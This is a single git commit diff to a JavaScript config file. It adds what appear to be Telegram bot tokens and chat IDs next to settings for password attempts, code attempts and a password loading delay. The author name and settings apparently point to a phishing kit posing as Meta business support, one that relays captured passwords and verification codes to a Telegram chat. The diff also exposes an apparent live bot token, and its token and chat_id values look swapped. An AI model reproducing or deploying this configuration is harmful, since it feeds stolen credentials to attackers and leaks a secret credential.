94dbcc95368ec38891d1f5cfcb8c209fecc3f8e2
SupportMetabusiness <dinhcongtruong2222@gmail.com>
2026-01-07 10:13:26 +0700

    Update configuration tokens and chat IDs

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,8 +1,8 @@
 const config = {
-    token: '',
-    chat_id: '',
-    noti_token: '',
-    noti_chat_id: '',
+    token: '-1002812438721',
+    chat_id: '8277574376:AAFomOevVKeriRaxZJUhJpiA2oCS90y7BW8',
+    noti_token: '8277574376:AAFomOevVKeriRaxZJUhJpiA2oCS90y7BW8',
+    noti_chat_id: '-4760975612',
     max_password_attempts: 2,
     max_code_attempts: 4,
     password_loading_time: 5,
